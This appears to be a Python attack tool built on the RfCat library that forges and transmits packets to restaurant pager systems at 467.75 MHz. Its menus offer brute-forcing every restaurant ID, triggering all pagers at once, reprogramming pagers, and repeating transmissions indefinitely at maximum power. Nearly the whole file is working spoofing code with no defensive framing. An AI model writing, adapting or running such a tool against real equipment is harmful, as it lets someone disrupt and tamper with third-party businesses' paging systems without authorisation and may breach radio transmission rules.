from rflib import *
from consolemenu import SelectionMenu


def calculate_crc(pre, sink_word, rest_id, station_id, pager_n, alert_type):

    l = re.findall('..', pre + sink_word + rest_id +
                   station_id + pager_n + '0000000000' + alert_type)

    bin_array = []
    for c in l:
        bin_array.append((format(int(c, 16), '08b')))

    sum = 0
    for b in bin_array:
        sum += int(b, 2)

    foo = '{0}{1}{2}{3}{4}{5}{6}{7}'.format(
        pre, sink_word, rest_id, station_id, pager_n, '0000000000', alert_type, format((sum % 255), '02x'))
    print("d.RFxmit(bytes.fromhex('"+foo+"'))")
    return foo


def calculate_program_crc(pre, sink_word, rest_id, station_id, pager_n, misc1, alert_type, command):

    l = re.findall('..', pre + sink_word + rest_id +
                   station_id + pager_n + misc1 + alert_type + command)

    bin_array = []
    for c in l:
        bin_array.append((format(int(c, 16), '08b')))

    sum = 0
    for b in bin_array:
        sum += int(b, 2)

    foo = '{0}{1}{2}{3}{4}{5}{6}{7}{8}'.format(
        pre, sink_word, rest_id, station_id, pager_n, misc1, alert_type, command, format((sum % 255), '02x'))
    print((pre, sink_word, rest_id, station_id,
          pager_n, misc1, alert_type, command))

    print(("d.RFxmit(bytes.fromhex('"+foo+"'))"))
    bin_array.append(format((sum % 255), '08b'))
    return foo


rest_options = ["Brute Force All Restaurants",
                "Prompt Restaurant ID", "Reprogram pager"]
rest_terminal_menu = SelectionMenu(rest_options, "Select an option")
rest_terminal_menu.show()
rest_terminal_menu.join()

rest_menu_entry_index = rest_terminal_menu.selected_option
rest_entry = rest_options[rest_menu_entry_index].lower()


if ('prompt' in rest_entry or 'reprogram' in rest_entry):
    rest_start = int(input('Enter restauraunt id: '))
    rest_end = rest_start+1
else:
    rest_start = 0
    rest_end = 255 + 1

if ('reprogram' not in rest_entry):
    pager_options = ["Target All Pagers (0)", "Prompt for Pager ID"]
    pager_terminal_menu = SelectionMenu(pager_options, "Select an option")
    pager_terminal_menu.show()
    pager_terminal_menu.join()
    pager_menu_entry_index = pager_terminal_menu.selected_option

else:
    pager_options = [""]
    pager_menu_entry_index = 0

pager_entry = pager_options[pager_menu_entry_index].lower()

if ('prompt' in pager_entry or 'reprogram' in rest_entry):
    pager_number = int(input('Enter pager number: '))
else:
    pager_number = 0

alert_options = ["Flash 30 Seconds|1", "Flash 5 Minutes|2", "Flash/Beep 5X5|3", "Beep 3 Times|4",
                 "Beep 5 Minutes|5", "Glow/Vib 15 Times|7", "Flash/Vib 1 Second|10", "Beep 3 times|68", "Manually enter|99"]

if ('reprogram' in rest_options[rest_menu_entry_index].lower()):
    alert_options = ["Vibrate |1", "Dont Vibrate |0"]

alert_terminal_menu = SelectionMenu(alert_options, "Select an option")
alert_terminal_menu.show()
alert_terminal_menu.join()
alert_menu_entry_index = alert_terminal_menu.selected_option
alert_type = int(alert_options[alert_menu_entry_index].split('|')[1])
print(alert_type)
if (alert_type == 99):
    alert_type = int(input("Enter manual alert type: "))


repeat_options = ["Repeat Once",
                  "Repeat Indefinitely", "Manually Enter"]
repeat_terminal_menu = SelectionMenu(repeat_options, "Select an option")
repeat_terminal_menu.show()
repeat_menu_entry_index = repeat_terminal_menu.selected_option
repeat_entry = repeat_options[repeat_menu_entry_index].lower()

if ('manually' in repeat_entry):
    repeat_number = int(input('Enter repeat amount: '))
elif ('once' in repeat_entry):
    repeat_number = 0
else:
    repeat_number = 9999

print(rest_start, rest_end, pager_number, alert_type, repeat_number)
d = RfCat()
d.setMdmModulation(MOD_2FSK)
d.setFreq(467750000)
d.setMdmSyncMode(0)
d.setMdmDeviatn(15000)
d.setMdmDRate(625)
d.setMaxPower()
d.setModeIDLE()
d.setEnableMdmManchester(1)
d.setAmpMode(1)
d.setModeIDLE()

for rest_id in range(rest_start, rest_end):
    pre = format(11184810, '06x')
    sink_word = format(64557, '04x')
    rest_id = format(rest_id, '02x')
    station_id = '0'
    pager_n = format(pager_number, '03x')
    misc1 = format(16777215, '02x')
    alert_command = format(int(alert_type), '02x')
    command = format(0, '05x')

    if ('reprogram' in rest_entry):
        sink_word = format(47698, '04x')
        alert_command = format(int(alert_type), '0x')
        print(pre+sink_word+rest_id+station_id +
              pager_n+misc1+alert_command+command)
        crc_out = calculate_program_crc(
            pre, sink_word, rest_id, station_id, pager_n, misc1, alert_command, command)
    else:
        print(pre+sink_word+rest_id+station_id+pager_n+alert_command)
        crc_out = calculate_crc(pre, sink_word, rest_id,
                                station_id, pager_n, alert_command)
    print("repeat = " + str(repeat_number))
    for repeat in range(0, repeat_number + 1):
        print("Repeating ", repeat)
        d.RFxmit(bytes.fromhex(crc_out))
    d.setModeIDLE()

d.setAmpMode(0)
